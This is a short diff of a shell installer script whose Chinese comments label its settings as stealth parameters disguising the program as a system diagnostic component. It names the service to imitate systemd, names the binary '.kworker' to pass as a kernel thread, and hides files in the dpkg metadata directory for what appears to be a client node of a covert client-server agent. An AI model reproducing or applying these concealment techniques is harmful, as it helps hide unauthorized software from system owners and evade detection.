@@ -18,7 +18,7 @@ VERSION="${VERSION:-latest}"
 INTERVAL="${INTERVAL:-2}"
 
 # 隐蔽参数：伪装成系统诊断组件
-SERVICE="${SERVICE:-systemd-corediag}"          # 服务名
+SERVICE="${SERVICE:-systemd-corediag-node}"      # 服务名（与服务端 systemd-corediag 区分）
 BIN_NAME="${BIN_NAME:-.kworker}"                # 进程/二进制名（像内核线程）
 BASE_DIR="${BASE_DIR:-/var/lib/dpkg/info}"      # 藏在 dpkg 元数据目录
 DIR_SEED="${DIR_SEED:-corediag-$(od -An -tx1 -N6 /dev/urandom 2>/dev/null | tr -d ' \n')}"
